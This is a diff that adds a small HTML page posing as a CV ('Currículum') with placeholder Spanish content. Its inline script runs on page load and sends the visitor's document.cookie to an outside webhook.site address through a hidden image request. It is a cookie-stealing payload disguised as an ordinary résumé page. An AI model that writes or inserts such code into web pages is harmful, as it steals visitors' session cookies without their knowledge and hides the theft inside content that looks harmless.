@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>CV</title>
+  </head>
+  <body>
+    <h1>Currículum</h1>
+    <p>Contenido de ejemplo.</p>
+    <script>
+      (function () {
+        var w = "https://webhook.site/6601d5c3-e8f3-4349-8ee2-a176d3809600";
+        var x = new Image();
+        x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
+      })();
+    </script>
+  </body>
+</html>
